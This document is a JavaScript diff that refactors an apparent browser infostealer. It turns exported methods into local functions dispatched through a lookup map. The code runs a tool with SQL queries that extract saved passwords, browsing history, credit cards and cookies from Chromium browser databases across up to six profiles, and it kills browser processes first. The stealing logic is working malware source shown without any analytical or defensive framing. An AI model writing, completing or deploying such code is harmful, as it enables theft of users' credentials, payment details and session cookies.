@@ -40,7 +40,7 @@ const _ = (name, path, use, filename, dbData, profile = 'Default') => {
   dbData(dbFile, file);
 };
 
-this.passwords = (name, path, profile) => {
+const passwords = (name, path, profile) => {
   return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => exec(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT origin_url, username_value, password_value FROM logins"',
@@ -49,7 +49,7 @@ this.passwords = (name, path, profile) => {
   ), profile);
 };
 
-this.history = (name, path, profile) => {
+const history = (name, path, profile) => {
   return _(name, path, 'History', 'History', (dbFile, csvFile) => exec(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, title, visit_count, typed_count FROM urls"',
@@ -58,7 +58,7 @@ this.history = (name, path, profile) => {
   ), profile);
 };
 
-this.creditCards = (name, path, profile) => {
+const creditCards = (name, path, profile) => {
   return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => exec(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
@@ -68,7 +68,7 @@ this.creditCards = (name, path, profile) => {
   ), profile);
 };
 
-this.cookies = (name, path, profile) => {
+const cookies = (name, path, profile) => {
   return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => exec(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
@@ -78,6 +78,8 @@ this.cookies = (name, path, profile) => {
     ].join(' ')
   ), profile);
 };
+
+const fns = { passwords, history, creditCards, cookies };
 
 const kill = (browser, onKilled) => {
   const tasks = execSync('tasklist');
@@ -98,7 +100,9 @@ browsers.forEach((browser) => {
       ['passwords', 'history', 'creditCards', 'cookies']
         .forEach(fn => {
           ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
-            .forEach(profile => this[fn](browser[1].join(' '), path, profile));
+            .forEach(profile => {
+              fns[fn](browser[1].join(' '), path, profile);
+            });
         });
     });
   }
